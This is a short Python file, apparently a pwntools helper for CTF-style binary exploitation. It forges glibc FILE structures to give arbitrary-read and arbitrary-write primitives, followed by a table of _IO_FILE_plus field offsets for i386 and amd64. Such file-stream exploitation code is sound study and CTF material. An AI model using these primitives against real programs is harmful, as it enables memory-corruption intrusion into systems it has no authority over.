from pwn import *

class FILESTRUCTURE:
    def __init__(self):
        self.FS = FileStructure(0)
        
    def aar(self, padding: bytes ,flags: int ,target_addr: int ,size: int ,lock_addr:int ):
        self.FS.flags = flags 
        self.FS._IO_read_end = target_addr
        self.FS._IO_write_base = target_addr
        self.FS._IO_buf_end = target_addr + size
        self.FS._IO_write_ptr = target_addr + size
        self.FS._lock = lock_addr
        self.FS.fileno = 1

        return padding + bytes(self.FS)[:-8]

    def aaw(self, padding: bytes , flags: int , target_addr: int , size: int, lock_addr:int ):
        self.FS.flags = flags
        self.FS._lock = lock_addr
        self.FS._IO_buf_base = target_addr
        self.FS._IO_buf_end = target_addr + size
        self.FS.fileno = 0
	
        return padding + bytes(self.FS)[:-8]
    
'''
_IO_FILE_plus_size = {
    'i386':0x98,
    'amd64':0xe0
}
_IO_FILE_plus = {
    'i386':{
        0x0:'_flags',
        0x4:'_IO_read_ptr',
        0x8:'_IO_read_end',
        0xc:'_IO_read_base',
        0x10:'_IO_write_base',
        0x14:'_IO_write_ptr',
        0x18:'_IO_write_end',
        0x1c:'_IO_buf_base',
        0x20:'_IO_buf_end',
        0x24:'_IO_save_base',
        0x28:'_IO_backup_base',
        0x2c:'_IO_save_end',
        0x30:'_markers',
        0x34:'_chain',
        0x38:'_fileno',
        0x3c:'_flags2',
        0x40:'_old_offset',
        0x44:'_cur_column',
        0x46:'_vtable_offset',
        0x47:'_shortbuf',
        0x48:'_lock',
        0x4c:'_offset',
        0x54:'_codecvt',
        0x58:'_wide_data',
        0x5c:'_freeres_list',
        0x60:'_freeres_buf',
        0x64:'__pad5',
        0x68:'_mode',
        0x6c:'_unused2',
        0x94:'vtable'
    },

    'amd64':{
        0x0:'_flags',
        0x8:'_IO_read_ptr',
        0x10:'_IO_read_end',
        0x18:'_IO_read_base',
        0x20:'_IO_write_base',
        0x28:'_IO_write_ptr',
        0x30:'_IO_write_end',
        0x38:'_IO_buf_base',
        0x40:'_IO_buf_end',
        0x48:'_IO_save_base',
        0x50:'_IO_backup_base',
        0x58:'_IO_save_end',
        0x60:'_markers',
        0x68:'_chain',
        0x70:'_fileno',
        0x74:'_flags2',
        0x78:'_old_offset',
        0x80:'_cur_column',
        0x82:'_vtable_offset',
        0x83:'_shortbuf',
        0x88:'_lock',
        0x90:'_offset',
        0x98:'_codecvt',
        0xa0:'_wide_data',
        0xa8:'_freeres_list',
        0xb0:'_freeres_buf',
        0xb8:'__pad5',
        0xc0:'_mode',
        0xc4:'_unused2',
        0xd8:'vtable'
    }
}
'''